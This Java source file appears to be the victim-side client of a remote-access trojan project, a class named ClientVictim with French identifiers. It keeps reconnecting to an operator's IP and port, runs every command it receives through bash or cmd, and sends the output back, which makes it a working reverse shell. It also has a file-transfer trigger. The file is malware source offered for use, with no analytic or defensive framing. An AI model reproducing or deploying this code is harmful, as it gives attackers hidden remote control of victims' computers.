import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.nio.charset.Charset;
import java.nio.charset.CharsetDecoder;
import java.sql.Date;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.GregorianCalendar;

import org.omg.CORBA.portable.Streamable;
import org.omg.IOP.Encoding;


public class ClientVictim extends Thread implements IUtilisateurDEcouteur{
	
	private String ip;
	private int port;
	private Socket socket;
	private File logFile;
	private File logFileTentativeConnexion;
	private PrintWriter BufferDEcritureLog;
	private PrintWriter BufferDEcritureLogTentativeConnexion;
	String date = new SimpleDateFormat("dd-MM-YY").format(new java.util.Date());
	private PrintWriter BufferDEnvoie;
	private EcouteurMessage EcouteurMessage;
	
	
	Process p;
	String resultFinal;
	
	
	public ClientVictim(String IP, int PORT) {
		this.ip = IP;
		this.port = PORT;
		
		if(Main.logEnabled){
			this.logFile = new File("C:\\Users\\rben-hmidane\\Desktop\\logProjTroj.txt");
			this.logFileTentativeConnexion = new File("C:\\Users\\rben-hmidane\\Desktop\\logProjTrojTentatives.txt");
			try {
				
				this.BufferDEcritureLog = new PrintWriter(new FileWriter(this.logFile, true), true);
				this.BufferDEcritureLogTentativeConnexion = new PrintWriter(new FileWriter(this.logFileTentativeConnexion, true), true);
				//this.connexion();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
		
		
		
	}
	
	
	public void run() {
		
		System.out.println("Nouvelle connexion\n\n");
		
		this.connexion();
		
	}
	
	public Socket getSocket() {
		return this.socket;
	}
	
	public void connexion() {
		boolean connection = false;
		
		while(connection == false){
			if(Main.logEnabled)
			this.EcrireNotificationLogTentativeINFO("Tentative Connexion...");
			try {
				
				this.socket = new Socket(this.ip, this.port);
				if(Main.logEnabled) {
					this.EcrireNotificationLogINFO("Connexion r�ussie");
					this.EcrireSautsDeLignes(this.BufferDEcritureLogTentativeConnexion, 1);
					this.EcrireNotificationLogTentativeINFO("CONNEXION REUSSIE");
					this.EcrireSautsDeLignes(this.BufferDEcritureLogTentativeConnexion, 3);
				}
				
				this.BufferDEnvoie = new PrintWriter(this.socket.getOutputStream());
				this.EcouteurMessage = new EcouteurMessage(this);
				this.EcouteurMessage.start();
				connection = true;
				System.out.println("ConnexionR�ussie");
			} catch (Exception e) {
				System.out.println("Connexion Echou�e\n"+e.getMessage());
			}
			
			if(connection == false) {
				try {
					this.sleep(Main.tempsEntreConnexions);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
		System.out.println("Fin d'essaie connexion");
	}
	
	public void Disconnection() {
		this.BufferDEnvoie.close();
		this.EcouteurMessage.close();
		try {
			
			
			this.socket.close();
			if(Main.logEnabled)
			this.EcrireNotificationLogINFO("Fermeture de la connexion");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
	}
	
	public void EcrireNotificationLogINFO(String message) {
	
		this.BufferDEcritureLog.println("("+date+") ["+new SimpleDateFormat("HH:mm:ss").format(new java.util.Date())+"] INFO : "+message);
		//this.BufferDEcritureLog.println("Nouvel ajout "+message);
		this.BufferDEcritureLog.flush();
		
	}
	
	public void EcrireNotificationLogERROR(String message) {
		
		this.BufferDEcritureLog.println("("+date+") ["+new SimpleDateFormat("HH:mm:ss").format(new java.util.Date())+"] ERROR : "+message);
		this.BufferDEcritureLog.flush();
		
	}
	
	public void EcrireNotificationLogTentativeINFO(String message) {
		
		this.BufferDEcritureLogTentativeConnexion.println("("+date+") ["+new SimpleDateFormat("HH:mm:ss").format(new java.util.Date())+"] INFO : "+message);
		
		
	}
	
	public void EcrireNotificationLogTentativeERROR(String message) {
		
		this.BufferDEcritureLogTentativeConnexion.println("("+date+") ["+new SimpleDateFormat("HH:mm:ss").format(new java.util.Date())+"] ERROR : "+message);
		
		
	}
	
	public void TraitementMessage(String message) {
		if(message.toLowerCase().startsWith("envoi")) {
			ConnexionFichier c = new  ConnexionFichier();
			c.start();
		}else
			this.EnvoieMessage(this.AppelsSysteme(message));
	}
	


	public String AppelsSysteme(String message) {
		this.resultFinal = "";
		try {
			String[] mConsole;
			

			if(Main.osactu.equals(OS.linux)) {
				mConsole = new String[] {
						"/bin/bash", "-c", message };
			}else if (Main.osactu.equals(OS.windows)) {
				mConsole = new String[] {
						"cmd","/c", message };
			}else if (Main.osactu.equals(OS.Maccintosh)) {
				return "Commandes pour maccintosh pas encore implémentées";
			}else {
				return "OS actuel inconnu";
			}

			p = Runtime.getRuntime().exec(mConsole);								


			ThreadBufferProcess threadInputStream = new ThreadBufferProcess(this, new BufferedReader(new InputStreamReader(p.getInputStream(), Main.encodingTerminal)), "input");
			ThreadBufferProcess threadErrorStream = new ThreadBufferProcess(this, new BufferedReader(new InputStreamReader(p.getErrorStream(), Main.encodingTerminal)), "error");

			threadInputStream.start();
			threadErrorStream.start();

			synchronized (this) {
				try {
					this.wait();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				threadErrorStream.interrupt();
				threadInputStream.interrupt();
			}	
			
			//----
			//Windows
			/*
			Process p = Runtime.getRuntime().exec("cmd /c "+message);
			BufferedReader buffer = new BufferedReader(new InputStreamReader(p.getInputStream(), Main.encodingTerminal));
			
			
			String tmp;		
			
			
			while((tmp = buffer.readLine()) != null) {
				//System.setProperty("file.encoding", Main.encodingTerminal);
				resultFinal += tmp+"\n";
			}*/
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return this.resultFinal;
	}
	
	public void setResultFinal(String s){
		this.resultFinal = s;
	}
	
	public String getResultFinal() {
		return resultFinal;
	}
	
	public void EnvoieMessage(String message) {
	
		
			this.BufferDEnvoie.println(message);
			
			this.BufferDEnvoie.flush();
	}
	
	
	public void EcrireSautsDeLignes(PrintWriter p, int nbLignes) {
		for(int i=0; i<nbLignes; i++) {
			p.println();
		}
	}
	
	
}
